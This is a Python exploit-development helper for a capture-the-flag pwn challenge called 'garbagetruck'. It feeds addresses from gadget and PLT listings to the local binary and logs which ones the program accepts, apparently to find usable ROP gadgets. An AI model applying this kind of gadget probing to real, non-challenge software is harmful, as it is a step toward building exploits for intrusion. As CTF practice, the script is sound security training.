#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './garbagetruck_04bfbdf89b37bf5ac5913a3426994185b4002d65'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]})
env.select('local')

#==========

def check_file(name):
    conn = communicate(env.mode, **env.target)
    pattern  = []
    pattern += [re.compile(r'.+\[91m(0x[0-9a-f]+)\x1b\[0m: \x1b\[92m(.+)')]
    pattern += [re.compile(r'([0-9a-f]+) <(.+@plt)>:')]

    for line in open(name):
        for pat in pattern:
            r = pat.match(line)
            if r is not None:
                break

        if r is None:
            continue

        addr, gadget = int(r.group(1), 16), r.group(2)
        while True:
            try:
                conn.sendlineafter('> ', str(addr))
                if 'Throwing away' in conn.recvuntil('\n'):
                    info('0x{:08x} : {}'.format(addr, gadget))
            except:
                conn.close()
                conn = communicate(env.mode, **env.target)
            else:
                break

def check_raw():
    conn = communicate(env.mode, **env.target)

    while True:
        s = raw_input('> ')
        if '-' in s:
            s = map(lambda x: int(x, 16), s.split('-'))
            addrs = range(s[0], s[1])
        else:
            addrs = map(lambda x: int(x, 16), s.split())

        for addr in addrs:
            conn.sendlineafter('> ', str(addr))
            if 'Throwing away' in conn.recvuntil('\n'):
                info('setable 0x{:08x}'.format(addr))
            else:
                warn('NOT setable 0x{:08x}'.format(addr))

#==========

if __name__=='__main__':
    if len(sys.argv) > 1:
        check_file(sys.argv[1])
    else:
        check_raw()
   
#==========
